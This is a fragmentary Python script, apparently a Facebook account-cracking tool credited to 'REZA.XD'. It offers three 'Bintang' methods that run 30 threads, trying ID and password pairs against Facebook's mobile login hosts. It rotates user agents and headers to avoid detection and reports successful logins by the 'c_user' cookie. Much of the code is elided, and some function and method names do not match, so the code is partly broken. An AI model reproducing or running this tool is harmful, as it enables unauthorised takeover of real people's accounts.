...
{puti}Update   : {biru}REZA.XD
{puti}Script   : {biru}Facebook
{puti}Github   : {biru}Reza-XD
{puti}Status   : {biru}Free
{puti}Version  : {biru}1.4.3                                                                                                                                       ''')
#kukis
def login():
	os.system('clear')
	banner()
...
def atur_method():
	print("")
	print(f'{kun}└──[{puti} 01. Bintang V1')
	print(f'{kun}└──[{puti} 02. Bintang V2')
	print(f'{kun}└──[{puti} 03. Bintang V3')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('Bintang V1')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('Bintang V2')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('Bintang V3')
	else:
		method.append('BintangV1')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	...
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				...
				if 'bintangv1' in method:
				    pemuda_tersakiti.submit(crackbintangv1,idf,pwx,'m.prod.facebook.com')
				elif 'bintangv2' in method:
				    pemuda_tersakiti.submit(crackbintangv2,idf,pwx,'m.facebook.com')
				elif 'bintangv3' in method:
				    pemuda_tersakiti.submit(crackbintangv3,idf,pwx,'m.alpha.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackbintangv1,idf,pwx,'m.facebook.com')
...
#----------[ METODE-BintangV1]----------#	
def crackbintangv1(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["☁",])
	prog.update(des,description=f"\r {emot}(Reza XD)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ua = iphone()
			ua2 = ("Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G925A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36")
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Mode: Reza.XD|CHEKPOINT ")
				print(f'{kun}{ua}')
...
#----------[ METODE-BintangV2]----------#	
def crackbintang2(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} ( BintangV2) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
...
#----------[ METODE-BintangV3]----------#	
def crackbintangv3(idf,pwx):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  emot = rc(["😝","😜","🤪"])
  prog.update(des,description=f"\r {emot} ( BintangV3 ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
  prog.advance(des)
  for pw in pwx:
    try:
      ...
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G925A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36"])
...
def ceker(idf,pw):
	...
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G925A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36",
